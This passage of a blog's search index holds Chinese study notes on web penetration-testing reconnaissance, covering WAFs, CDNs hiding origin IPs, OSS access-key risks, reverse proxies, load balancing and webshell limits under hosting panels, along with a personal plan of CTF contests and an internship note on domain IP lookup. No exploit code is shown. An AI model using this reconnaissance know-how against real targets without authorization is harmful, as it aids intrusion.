src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-06-05%20012642.png" alt="屏幕截图 2023-06-05 012642"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透-信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>03Web拓展-CDN&amp;WAF&amp;OSS&amp;反向&amp;负载均衡</title>
      <link href="/du-yu/information-collection-03.html"/>
      <url>/du-yu/information-collection-03.html</url>
      
        <content type="html"><![CDATA[<h2 id="一、WAF-：web-Application-firewall"><a href="#一、WAF-：web-Application-firewall" class="headerlink" title="一、WAF ：web Application firewall"></a>一、WAF ：web Application firewall</h2><p>原理：web应用防火墙，保护web</p><p>影响：安全测试手法被拦截</p><p>很难绕过</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230604195810154.png" alt="image-20230604195810154"></p><p>、<img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230604195848213.png" alt="image-20230604195848213"></p><h2 id="二、CDN（Content-Delivery-Network-）"><a href="#二、CDN（Content-Delivery-Network-）" class="headerlink" title="二、CDN（Content Delivery Network ）"></a>二、CDN（Content Delivery Network ）</h2><p>开通后全国分布有节点，超级ping能查到ping通的IP地址</p><p>原理：内容分发服务，旨在提高访问速度 </p><p>影响：隐藏真实源IP，导致对目标测试错误，看到的是节点</p><p>演示：阿里云备案域名全局CDN加速服务</p><p>Windows2012 + BT宝塔面板 + CDN服务</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230604195914239.png" alt="image-20230604195914239"></p><h2 id="三、OSS（Object-Storage-Service）"><a href="#三、OSS（Object-Storage-Service）" class="headerlink" title="三、OSS（Object Storage Service）"></a>三、OSS（Object Storage Service）</h2><p>云存储服务，旨在提高访问速度</p><p>阿里云OSS:</p><p>开OSS</p><p>2、新建Bucket</p><p>3、配置Bucket属性</p><p>4、配置Access访问</p><p>原理：</p><p>为什么要使用第三方存储？</p><p>1）静态文件会占用大量带宽</p><p>2）加载速度</p><p>3）存储空间</p><p>影响：</p><p>上传的文件或解析的文件均来自于OSS资源，无法解析，单独存储</p><p>1、修复上传安全</p><p>2、文件解析不一样</p><p>3、但Accesskey隐患</p><h2 id="四、反向代理"><a href="#四、反向代理" class="headerlink" title="四、反向代理"></a>四、反向代理</h2><h3 id="1、正向代理，挂VPN一个意思"><a href="#1、正向代理，挂VPN一个意思" class="headerlink" title="1、正向代理，挂VPN一个意思"></a>1、正向代理，挂VPN一个意思</h3><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230604195939721.png" alt="image-20230604195939721"></p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230604200708819.png" alt="image-20230604200708819"></p><h3 id="2、反向代理"><a href="#2、反向代理" class="headerlink" title="2、反向代理"></a>2、反向代理</h3><h4 id="将真实的目标指向任意一个站点"><a href="#将真实的目标指向任意一个站点" class="headerlink" title="将真实的目标指向任意一个站点"></a>将真实的目标指向任意一个站点</h4><p>主机只能访问服务器1，服务器2将数据放到服务器1，主机间接访问服务器2 </p><p><img src="C:\Users\asus\AppData\Roaming\Typora\typora-user-images\image-20230604200708819.png" alt="image-20230604200708819"></p><h4 id="如果设置了反向代理，比如反向代理设置为baidu-com-x2F"><a href="#如果设置了反向代理，比如反向代理设置为baidu-com-x2F" class="headerlink" title="如果设置了反向代理，比如反向代理设置为baidu.com/"></a>如果设置了反向代理，比如反向代理设置为baidu.com/</h4><h4 id="那么你访问设置了反向代理的网站，就会直接跳转到baidu-com-x2F"><a href="#那么你访问设置了反向代理的网站，就会直接跳转到baidu-com-x2F" class="headerlink" title="那么你访问设置了反向代理的网站，就会直接跳转到baidu.com/"></a>那么你访问设置了反向代理的网站，就会直接跳转到baidu.com/</h4><h2 id="五、负载均衡"><a href="#五、负载均衡" class="headerlink" title="五、负载均衡"></a>五、负载均衡</h2><p>原理：分摊到多个操作单元上进行执行，共同完成工作任务</p><p>影响：有多个服务器加载服务，  测试过程中存在多个目标情况</p><p>演示：Nginx负载均衡配置</p><p>Windows2012 + BT宝塔面板 + Nginx</p><h4 id="定义负载设置（和ISCC实战poc-exe设置原理一样，恶心啊！！ISCC不能在脚本里设置代理，搞了三天！！！）"><a href="#定义负载设置（和ISCC实战poc-exe设置原理一样，恶心啊！！ISCC不能在脚本里设置代理，搞了三天！！！）" class="headerlink" title="定义负载设置（和ISCC实战poc.exe设置原理一样，恶心啊！！ISCC不能在脚本里设置代理，搞了三天！！！）"></a>定义负载设置（和ISCC实战poc.exe设置原理一样，恶心啊！！ISCC不能在脚本里设置代理，搞了三天！！！）</h4><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230604204133704.png" alt="image-20230604204133704"></p><h1 id="小迪总结"><a href="#小迪总结" class="headerlink" title="小迪总结"></a>小迪总结</h1><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-06-04%20204854.png" alt="屏幕截图 2023-06-04 204854"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透-信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>02Web其他-前后端&amp;软件&amp;Docker&amp;分配站</title>
      <link href="/du-yu/information-collection-02.html"/>
      <url>/du-yu/information-collection-02.html</url>
      
        <content type="html"><![CDATA[<h2 id="一、-前后端分离"><a href="#一、-前后端分离" class="headerlink" title="一、 前后端分离"></a>一、 前后端分离</h2><h3 id="源码不同，前端源码和后端源码分离"><a href="#源码不同，前端源码和后端源码分离" class="headerlink" title="源码不同，前端源码和后端源码分离"></a>源码不同，前端源码和后端源码分离</h3><p>安全速度快，但大量数据传输不如传统网站</p><p>开发的框架，API传输数据</p><p>前端页面通过api接口传到后端，后台单独管理（类似于两个网站 ） </p><h3 id="1-前台只负责呈现（so基本没有漏洞）"><a href="#1-前台只负责呈现（so基本没有漏洞）" class="headerlink" title="1.前台只负责呈现（so基本没有漏洞）"></a>1.前台只负责呈现（so基本没有漏洞）</h3><p>js网站传输几乎都是API，基本不会有代码的逻辑性，页面光秃秃 </p><h3 id="2-后台更新影响前台"><a href="#2-后台更新影响前台" class="headerlink" title="2.后台更新影响前台"></a>2.后台更新影响前台</h3><p>后台域名大部分不在前端同域名中（so获取前端权限有可能不会影响后端） 能连接才能影响数据</p><p>扫描的时候找后端域名，如果找不到，查看前端框架有无历史漏洞，如果没有，只能尝试社工或者其他方法了</p><h2 id="二、宝塔-phpstudy（软件搭建的网站）"><a href="#二、宝塔-phpstudy（软件搭建的网站）" class="headerlink" title="二、宝塔+phpstudy（软件搭建的网站）"></a>二、宝塔+phpstudy（软件搭建的网站）</h2><p>(购买阿里云服务器，打开所有安全组，255端口要申请) </p><p>用不同软件搭建网站时，要关闭当前的网站</p><p>一个服务器只能支持一个软件搭建网站，端口会冲突</p><p>所需数据库，中间件不一样的话，也要关</p><p>###1.原理：打包类集成化环境，权限配置或受控制</p><h3 id="2-影响：攻击者权限对比区别（不同软件影响也不同）"><a href="#2-影响：攻击者权限对比区别（不同软件影响也不同）" class="headerlink" title="2.影响：攻击者权限对比区别（不同软件影响也不同）"></a>2.影响：攻击者权限对比区别（不同软件影响也不同）</h3><p>和常规搭建的网站最大区别就是权限区别 </p><p>宝塔：拿到权限后，webshell执行不了，文件管理锁定目录，只能看到当前网站目录，其他目录看不到，没有权限，宝塔自动加了限制    </p><p>phpstudy：whoami 获取用户权限 -administartor</p><p>自己IIS搭建有一半webshell能执行,目录也能查看一般</p><h2 id="三、docker-容器（都是假的，除非逃逸出去）"><a href="#三、docker-容器（都是假的，除非逃逸出去）" class="headerlink" title="三、docker 容器（都是假的，除非逃逸出去）"></a>三、docker 容器（都是假的，除非逃逸出去）</h2><p>原理：虚拟化技术独立磁盘空间，非真实物理环境</p><p>影响：攻击者虚拟空间磁盘 </p><h2 id="四、建站分配站（攻击的不是目标是建站平台，信息收集的时候先搜索下域名）"><a href="#四、建站分配站（攻击的不是目标是建站平台，信息收集的时候先搜索下域名）" class="headerlink" title="四、建站分配站（攻击的不是目标是建站平台，信息收集的时候先搜索下域名）"></a>四、建站分配站（攻击的不是目标是建站平台，信息收集的时候先搜索下域名）</h2><h3 id="1-托管（有版权）（面对的是安全公司）"><a href="#1-托管（有版权）（面对的是安全公司）" class="headerlink" title="1.托管（有版权）（面对的是安全公司）"></a>1.托管（有版权）（面对的是安全公司）</h3><h3 id="2-申请（没有版权）（攻击的不是目标是建站平台，信息收集的时候先搜索下域名）"><a href="#2-申请（没有版权）（攻击的不是目标是建站平台，信息收集的时候先搜索下域名）" class="headerlink" title="2.申请（没有版权）（攻击的不是目标是建站平台，信息收集的时候先搜索下域名）"></a>2.申请（没有版权）（攻击的不是目标是建站平台，信息收集的时候先搜索下域名）</h3><p>原理：利用别人域名模版建立  </p><p>影响：实质安全测试非目标资产</p><h2 id="五、静态Web"><a href="#五、静态Web" class="headerlink" title="五、静态Web"></a>五、静态Web</h2><p>例子：大学学的html设计的网站（单一，想修改页面只能改源代码）</p><p>原理：数据没有传输性（js传输不算）</p><p>影响：无漏洞</p><h2 id="六、伪静态"><a href="#六、伪静态" class="headerlink" title="六、伪静态"></a>六、伪静态</h2><p>动态转为静态技术，伪装的静态</p><h1 id="小迪总结"><a href="#小迪总结" class="headerlink" title="小迪总结"></a>小迪总结</h1><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-06-04%20181607.png" alt="屏幕截图 2023-06-04 181607"></p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透-信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>01web常规-系统&amp;中间件&amp;数据库&amp;源码</title>
      <link href="/du-yu/information-collection-01.html"/>
      <url>/du-yu/information-collection-01.html</url>
      
        <content type="html"><![CDATA[<img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202023-06-04%20090622.png" alt="屏幕截图 2023-06-04 090622" style="zoom: 67%;"><h2 id="web四大件作用"><a href="#web四大件作用" class="headerlink" title="web四大件作用"></a>web四大件作用</h2><p>系统、中间件、数据库、源代码</p><h2 id="网站有哪些展示"><a href="#网站有哪些展示" class="headerlink" title="网站有哪些展示"></a>网站有哪些展示</h2><p>子域名模式 </p><p>端口模式</p><p>目录模式</p><p>公司发放的IP，扫描时扫描公司所有的IP</p><p>##文件访问解析</p><p>中间件、解析规则：中间解析规则决定上传到目标是什么类型</p><p>源文件的权限决定</p><p>锁图片文件，依旧可看，但没有执行了，有后门也不行</p><h2 id="源码配置文件"><a href="#源码配置文件" class="headerlink" title="源码配置文件"></a>源码配置文件</h2><p>1.数据库直接放在本地</p><p>2.数据库和网站分离，放在另外一个服务器上</p><p>数据库直接放到云端，拿到数据库账户密码也不行，云端只支持网站源码连接，可能只允许某些账号或目标访问</p><p>app.config数据库配置文件</p><h2 id="源码开源"><a href="#源码开源" class="headerlink" title="源码开源"></a>源码开源</h2><p>开源-源码可见</p><p>开源-源码不可见：各种加密，百度上有ASP加密     ，PHP加密什么的</p><p>语言特性决定：java运行以后就会改变                     </p><p>开源是为了白盒测试-代码审计</p><h2 id="源码结构目录"><a href="#源码结构目录" class="headerlink" title="源码结构目录"></a>源码结构目录</h2><p>admin后台管理相关</p><p>bin指引目录</p><p>database数据库相关</p><p>images图片相关</p><p>js前端文件</p><p>member会员</p><p>template模板</p><p>upfiles文件上传</p><p>webservice网站服务</p><p>##路由访问</p><p>常规：url+文件路径            url和文件目录对应不上，要根据路由配置决定</p><h1 id="小迪总结"><a href="#小迪总结" class="headerlink" title="小迪总结"></a>小迪总结</h1><h3 id="常规化"><a href="#常规化" class="headerlink" title="常规化"></a>常规化</h3><p>原理：源码数据都在同服务器</p><p>影响：无，常规安全测试手法</p><h3 id="站库分离："><a href="#站库分离：" class="headerlink" title="站库分离："></a>站库分离：</h3><p>原理：源码数据库不在同服务器</p><p>存储：其他服务器上数据库&amp;云数据库产品</p><p>影响：数据被单独存放，能连接才可影响数据</p>]]></content>
      
      
      <categories>
          
          <category> 渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透-信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Destiny-plan</title>
      <link href="/du-yu/destiny-plan.html"/>
      <url>/du-yu/destiny-plan.html</url>
      
        <content type="html"><![CDATA[<h1 id="一、备忘录"><a href="#一、备忘录" class="headerlink" title="一、备忘录"></a>一、备忘录</h1><p>1、美化终端<br>2、复盘<br>3、金砖<br>4、渊龙sec团队招新<br>5、Tryhackme<br>6、看迪宝！！！<br>7、世界战队排名！！<br>8、7月底的护网<br>9、edu可以直接打，证明有漏洞就行，不要碰其他（文件上传证明可以解析即可，不强制webhell，木马和phpinfo都不用证明，输出123就行了）<br>10、出题！！！！<br>11、pwndbg、GDB动态调试、ROP、checksec、libcsearcher、 binutils 工具集、readelf \ objdump<br>12、future群聊下载文件</p><h1 id="二、护网"><a href="#二、护网" class="headerlink" title="二、护网"></a>二、护网</h1><p>1、面试<br>2、国护！！！</p><h1 id="三、PWN"><a href="#三、PWN" class="headerlink" title="三、PWN"></a>三、PWN</h1><h1 id="四、战队"><a href="#四、战队" class="headerlink" title="四、战队"></a>四、战队</h1><p>WM<br>NUL_1<br>蓝水<br>小猪<br>山海关Arr3sty0u<br>渊龙sec</p><h1 id="五、电子取证"><a href="#五、电子取证" class="headerlink" title="五、电子取证"></a>五、电子取证</h1><h1 id="比赛"><a href="#比赛" class="headerlink" title="比赛"></a>比赛</h1><p>1、ISCC线下决赛<br>2、金砖9月报名截止<br>3、蓝帽杯   <a href="https://datacon.qianxin.com/competition/competitions/53/introduction">https://datacon.qianxin.com/competition/competitions/53/introduction</a><br>4、强网杯<br>5、天网杯（安全漏洞挖掘大赛）<br>6、公安内网<br>7、AVSS 8月10日前  <a href="https://geekcon.darknavy.com/2023/china/">https://geekcon.darknavy.com/2023/china/</a>   <a href="https://mp.weixin.qq.com/s/6FUI20gSEkGoKTVADNn_2Q">https://mp.weixin.qq.com/s/6FUI20gSEkGoKTVADNn_2Q</a></p>]]></content>
      
      
      <categories>
          
          <category> Destiny </category>
          
      </categories>
      
      
        <tags>
            
            <tag> plan </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>实习-信息收集</title>
      <link href="/du-yu/police-practice-01.html"/>
      <url>/du-yu/police-practice-01.html</url>
      
        <content type="html"><![CDATA[<h1 id="IP查询-amp-域名、网址分析"><a href="#IP查询-amp-域名、网址分析" class="headerlink" title="IP查询&amp;域名、网址分析"></a>IP查询&amp;域名、网址分析</h1><h2 id="总述：赶紧学习啊！！！"><a href="#总述：赶紧学习啊！！！" class="headerlink" title="总述：赶紧学习啊！！！"></a>总述：赶紧学习啊！！！</h2><p>实习第一天，让我解析一下领导留言板的域名：<a href="http://liuyan.people.com.cn/%EF%BC%8C%E5%88%9A%E5%BC%80%E5%A7%8B%E4%BB%A5%E4%B8%BA%E6%98%AF%E6%90%9C%E7%B4%A2IP%E5%9C%B0%E5%9D%80%E8%BF%9B%E8%A1%8C%E5%AE%9A%E4%BD%8D%EF%BC%8C%E5%8E%9F%E6%9D%A5%E6%98%AF%E6%8A%8A%E7%9B%B4%E6%8E%A5%E6%8A%8A%E7%BD%91%E5%9D%80%E6%94%BE%E5%88%B0%E7%AB%99%E9%95%BF%E5%B7%A5%E5%85%B7%E9%87%8C%E8%A7%A3%E6%9E%90">http://liuyan.people.com.cn/，刚开始以为是搜索IP地址进行定位，原来是把直接把网址放到站长工具里解析</a></p><h2 id="一、网站IP查询"><a href="#一、网站IP查询" class="headerlink" title="一、网站IP查询"></a>一、网站IP查询</h2><p>想要查询<a href="http://liuyan.people.com.cn/%E7%9A%84IP%E5%9C%B0%E5%9D%80%EF%BC%8C%E4%BD%BF%E7%94%A8">http://liuyan.people.com.cn/的IP地址，使用</a> ping liuyan.people.com.cn </p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230710095653955.png" alt="image-20230710095653955"></p><h2 id="二、网址分析"><a href="#二、网址分析" class="headerlink" title="二、网址分析"></a>二、网址分析</h2><p>使用站长工具：<a href="https://icp.chinaz.com/">https://icp.chinaz.com/</a></p><p>直接搜索网址</p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230710101151951.png" alt="image-20230710101151951"></p><p>感觉是<strong>资产收集</strong></p>]]></content>
      
      
      <categories>
          
          <category> 实习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 实习-信息收集 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
